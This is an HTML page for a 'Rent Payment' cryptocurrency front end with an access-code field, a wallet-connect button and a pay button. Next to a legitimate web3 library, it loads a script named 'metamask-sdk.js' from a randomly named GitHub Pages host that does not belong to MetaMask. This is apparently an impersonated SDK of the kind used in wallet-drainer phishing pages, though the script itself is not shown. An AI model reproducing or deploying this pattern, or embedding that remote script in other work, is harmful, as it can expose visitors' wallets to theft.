<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rent Payment</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
            background-image: url('bg.png'); /* Replace with your image file */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        .access-code-input {
            border: 2px solid #0847F7;
            background: transparent;
            color: #0847F7;
            padding: 1rem 4rem;
            font-size: 1.2rem;
            border-radius: 8px;
            margin-bottom: 2rem;
            text-align: center;
            outline: none;
            transition: background-color 0.3s, color 0.3s;
        }

        .access-code-input::placeholder {
            color: #0847F7;
            opacity: 0.7;
        }

        .access-code-input:focus {
            background-color:#fff;
            color: #0847F7;
        }
        .access-code-input:focus::placeholder {
    color: transparent;
}


        .pay-btn {
            background-color: #0847F7;
            color: white;
            border: none;
            padding: 1rem 2.5rem;
            font-size: 1.5rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.3rem;
            transition: background-color 0.2s;
            margin-top: 10px;
        }

        .pay-btn:hover {
            background-color: #083acb;
        }

        .amount {
            font-size: 1rem;
            font-weight: bold;
        }

        #connect-btn {
            width: 110px;
            height: 55px;
            background: #0847F7;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 500;
            margin-top: 10px;
            cursor: pointer;
        }

    </style>
</head>
<body>

    <input type="text" id="access-code" class="access-code-input" placeholder="Access Code">

    <button id="connect-btn">Connect Wallet</button>
    <button class="pay-btn" id="pay-btn">
        Pay Rent
        <span class="amount" id="amount-display">0 eth</span>
    </button>
    


    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js"></script>
    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
    <script type="module" src="./index.js"></script>

</body>
</html>
